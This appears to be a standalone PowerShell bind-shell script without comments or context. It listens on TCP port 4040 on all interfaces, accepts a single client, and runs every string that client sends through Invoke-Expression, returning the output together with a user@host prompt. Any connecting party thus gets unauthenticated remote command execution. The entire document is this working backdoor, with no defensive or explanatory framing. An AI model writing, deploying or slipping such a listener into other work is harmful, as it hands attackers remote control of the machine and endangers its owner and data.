function Get-Prompt
{
    "$($env:USERNAME)@$($env:COMPUTERNAME) $(Get-Location)>"
}

$socket = New-Object System.Net.Sockets.TcpListener("0.0.0.0", 4040)
Try
{
    $socket.Start()
    $client = $socket.AcceptTcpClient()  
    $stream = $client.GetStream() 
    [byte[]]$bytes = 0..65535| % {0}

    $promptBytes = [System.Text.Encoding]::ASCII.GetBytes((Get-Prompt))

    $stream.Write($promptBytes, 0, $promptBytes.Length)
    while(($readCount = $stream.Read($bytes, 0,  $bytes.Length)) -ne 0)
    {        
        $data = [System.Text.Encoding]::ASCII.GetString($bytes,0, $readCount)
        try
        {
             $result = (Invoke-Expression -Command $data 2>&1 | Out-String )
        }
        catch
        {
                Write-Warning "Command didnt execute" 
                Write-Error $_
        }
       
        $sendbyte    = [System.Text.Encoding]::ASCII.GetBytes($result)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $promptBytes = [System.Text.Encoding]::ASCII.GetBytes((Get-Prompt))
        $stream.Write($promptBytes, 0, $promptBytes.Length)
        $stream.Flush()  
    }
}
finally
{
    $socket.Stop()
    $client.Close()
    $stream.Dispose()
}

